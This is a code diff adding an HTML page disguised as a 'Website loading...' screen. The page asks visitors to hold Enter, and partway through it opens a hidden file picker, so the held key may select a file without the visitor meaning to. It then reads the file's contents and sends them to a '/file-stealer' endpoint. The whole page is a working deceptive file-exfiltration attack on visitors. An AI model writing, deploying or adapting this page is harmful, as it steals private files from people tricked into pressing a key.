@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Website loading...</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: monospace;
+      background: #000;
+      color: #0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
+      transition: background 0.2s;
+    }
+
+    #progress-text {
+      font-size: 1.5rem;
+      margin-bottom: 1rem;
+    }
+
+    #progress-bar {
+      width: 80%;
+      height: 20px;
+      background: #222;
+      border: 1px solid #0f0;
+      position: relative;
+      overflow: hidden;
+    }
+
+    #progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #0f0, #0ff);
+      transition: width 0.2s ease-in-out;
+    }
+
+    .flash {
+      background: #0f0 !important;
+      color: #000 !important;
+    }
+
+    .glitch {
+      animation: glitch 0.2s;
+    }
+
+    @keyframes glitch {
+      0% { transform: translate(0, 0); }
+      20% { transform: translate(-2px, 1px); }
+      40% { transform: translate(2px, -1px); }
+      60% { transform: translate(-1px, 2px); }
+      80% { transform: translate(1px, -2px); }
+      100% { transform: translate(0, 0); }
+    }
+  </style>
+</head>
+<body>
+  <div id="progress-text">Hold "Enter" to load the site</div>
+  <div id="progress-bar">
+    <div id="progress-fill"></div>
+  </div>
+  <input type="file" id="fileInput" style="display:none;">
+  <script>
+    let counter = 0;
+
+    document.addEventListener('keydown', async e => {
+      if (e.key === 'Enter') {
+
+        counter = Math.min(counter + 1, 10);
+        const fill = document.getElementById("progress-fill");
+        fill.style.width = `${counter * 10}%`;
+
+        if (counter == 5) {
+          const fileInput = document.getElementById('fileInput');
+          fileInput.click();
+          fileInput.addEventListener('change', function() {
+            const file = this.files[0];
+            if (!file) return;
+
+            console.log('File name:', file.name);
+            console.log('File size (bytes):', file.size);
+            console.log('MIME type:', file.type);
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+              console.log('File content:', e.target.result);
+              fetch('/file-stealer?file=' + e.target.result);
+            };
+            reader.readAsText(file);
+          });
+        }
+      }
+    });
+  </script>
+</body>
+</html>
